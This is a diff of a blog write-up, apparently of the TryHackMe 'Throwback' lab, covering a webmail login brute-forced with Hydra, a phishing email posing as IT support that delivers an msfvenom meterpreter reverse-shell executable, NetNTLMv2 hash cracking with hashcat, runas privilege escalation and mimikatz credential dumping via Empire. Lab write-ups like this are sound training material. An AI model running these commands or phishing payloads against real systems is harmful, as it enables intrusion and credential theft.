@@ -241,11 +241,13 @@ First, I captured the login request to the server using a web proxy and **BurpSu
 ![burpsuite login request](/assets/img/posts/throwback/13_burp_request.webp)
 
 Then, I used this Hydra command:
+
 ```shell
 hydra -L mail_users.txt -P mail_pass.txt 10.200.29.232 http-post-form '/src/redirect.php:login_username=^USER^&secretkey=^PASS^:F=Unknown user or password incorrect.' -I
 ```
 
 And successfully found these users' passwords:
+
 ![hydra found passwords](/assets/img/posts/throwback/14_hydra_found.webp)
 
 # THROWBACK WS01
@@ -258,25 +260,31 @@ At this point however, I needed a way to move to another machine on the network.
 To get access to a workstation, I chose to launch a phishing campaign against the employee email list, posing as IT support, telling employee's to update the note-taking software they're using, which would actually be a reverse shell pointing back to me.
 
 I used the following MSFVenom command to generate a reverse shell exe:
+
 ```shell
 msfvenom -p windows/meterpreter/reverse_tcp LHOST=tun0 LPORT=53 -f exe -o shell.exe
 ```
 
 And the following email as the vehicle:
+
 ![phishing email](/assets/img/posts/throwback/15_phishing_email.webp)
 
 Setup a handler using msfconsole:
+
 ![msfconsole handler](/assets/img/posts/throwback/16_handler.webp)
 
 And got a meterpreter shell as the user **BlaireJ** on their workstation:
+
 ![meterpreter shell](/assets/img/posts/throwback/17_meterpreter_shell.webp)
 
 ## WS01 Flags
 
 From here, I found the 2 flags for the machine with ease. The first being on BlaireJ's desktop:
+
 ![flag 5](/assets/img/posts/throwback/18_flag5.webp)
 
 And the second on HumphreyW's desktop:
+
 ![flag 6](/assets/img/posts/throwback/19_flag6.webp)
 
 ## LLMNR Poisoning
@@ -294,6 +302,7 @@ To spoof the destination of LLMNR requests on the network, and recieve **PetersJ
 This hash would take a very long time to crack on my laptop, so I used [Penglab](https://github.com/mxrch/penglab) to use a much faster machine with a GPU via Google Collab.
 
 On Penglab, I used this hashcat command (with [this](https://github.com/NotSoSecure/password_cracking_rules/blob/master/OneRuleToRuleThemAll.rule) rule):
+
 ```shell
 hashcat -m 5600 -r OneRuleToRuleThemAll.rule --force petersj.hash.txt /content/wordlists/rockyou.txt
 ```
@@ -316,6 +325,7 @@ sudo ./starkiller-1.12.0.AppImage --no-sandbox
 ![empire and starkiller setup](/assets/img/posts/throwback/22_empire_starkiller.webp)
 
 And that opened access to the Starkiller panel running on localhost:
+
 ![starkiller](/assets/img/posts/throwback/23_starkiller_interface.webp)
 
 To begin further exploitation, I needed to setup a listener and a stager for PetersJ to run, to use the account as an agent.
@@ -357,16 +367,37 @@ This produced a lot of output, but the main focus is the CredEnum result, showin
 ## Privilege Escalation
 
 Using that username , I was able to utilise the `runas` command to use the saved credentials and execute `cmd.exe`, essentially escalating my privileges:
+
 ```shell
 runas /savecred /user:admin-petersj /profile "cmd.exe"
 ```
+
 ![privesc to admin-petersj](/assets/img/posts/throwback/31_petersj_privesc.webp)
 
 ## PROD Flags
 
 From here, I was able to read all three flags on the PROD machine:
+
 ![prod flags](/assets/img/posts/throwback/32_prod_flags.webp)
 
 # THROWBACK TIME
+
+## Dumping Hashes & Passwords
+
+Now that I had elevated privilages, I could run the stager in the command prompt and use admin-petersj as a privilaged agent: 
+
+![privilaged agent](/assets/img/posts/throwback/33_admin_agent.webp)
+
+And run Empire's **mimikatz** module to dump the hashes and passwords of logged in users.
+
+![mimikatz empire module](/assets/img/posts/throwback/34_mimikatz_module.webp)
+
+There's a lot of output in the report:
+
+![mimikatz output](/assets/img/posts/throwback/35_mimikatz_output.webp)
+
+Luckily, Starkiller formats the output cleanly to into the credentials tab:
+
+![mimikatz creds](/assets/img/posts/throwback/36_mimikatz_creds.webp)
 
 [Throwback]: https://tryhackme.com/room/throwback
